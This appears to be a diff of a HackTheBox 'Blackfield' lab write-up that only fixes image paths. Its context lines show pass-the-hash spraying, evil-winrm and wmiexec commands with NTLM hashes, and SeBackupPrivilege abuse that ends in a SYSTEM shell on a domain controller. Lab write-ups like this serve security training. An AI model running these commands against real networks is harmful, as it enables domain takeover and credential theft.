@@ -183,7 +183,7 @@ Before attempting any password spraying or Pass-the-Hash (PtH) attacks, it was c
 ldapsearch -x -D "BLACKFIELD\support" -w '#00^BlackKnight' -H ldap://10.129.93.138 -b "dc=blackfield,dc=local" "(objectClass=domain)" lockoutThreshold lockoutDuration lockoutObservationWindow maxPwdAge minPwdAge minPwdLength pwdHistoryLength pwdProperties
 ```
 
-![ldap_result](image/browser_olG2XG6qKU.png) 
+![ldap_result](images/browser_olG2XG6qKU.png) 
 
 The lockout policy was favorable for spraying attacks, indicating a high `lockoutThreshold`.
 
@@ -214,7 +214,7 @@ Then, the CME command was executed:
 cme smb 10.129.93.138 -u users -H hashes
 ```
 
-![cme_result](image/browser_HnyDlR7ELO.png)
+![cme_result](images/browser_HnyDlR7ELO.png)
 
 The password spraying attack was successful, confirming the hash for `svc_backup`: **`svc_backup:9658d1d1dcd9250115e2205d9f48400d`**.
 
@@ -228,8 +228,8 @@ With the `svc_backup` hash, we gained a foothold into the domain.
 
 BloodHound confirmed that `svc_backup` was a member of the `Backups` group, which often holds `SeBackupPrivilege` and `SeRestorePrivilege`. We used `evil-winrm` to gain an interactive PowerShell session on the Domain Controller.
 
-![ad_result](image/browser_HsQVElLPvi.png) 
-![ad_result](image/browser_Z4s8m7PJkE.png)
+![ad_result](images/browser_HsQVElLPvi.png) 
+![ad_result](images/browser_Z4s8m7PJkE.png)
 
 ```bash
 evil-winrm -i 10.129.93.138 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
@@ -276,7 +276,7 @@ An attempt was made to directly access the Administrator's Desktop to retrieve `
 robocopy /b C:\Users\Administrator\Desktop\ C:\
 ```
 
-![rob_result](image/browser_MU3LEpUFhY.png) 
+![rob_result](images/browser_MU3LEpUFhY.png) 
 
 This attempt failed because even with `SeBackupPrivilege`, directly accessing `root.txt` within the Administrator's protected desktop via `robocopy` was not permitted in this context. This highlighted the need for a more robust method to obtain the Administrator's credentials.
 
@@ -388,7 +388,7 @@ wmiexec.py -hashes :184fb5e5178480be64824d4cd53b99ee administrator@10.129.93.138
 
 This command successfully provided a command prompt as the `NT AUTHORITY\SYSTEM` user, effectively granting full administrative control over the Domain Controller.
 
-![root_result](image/browser_ZuktRWFcwO.png)
+![root_result](images/browser_ZuktRWFcwO.png)
 
 -----
 
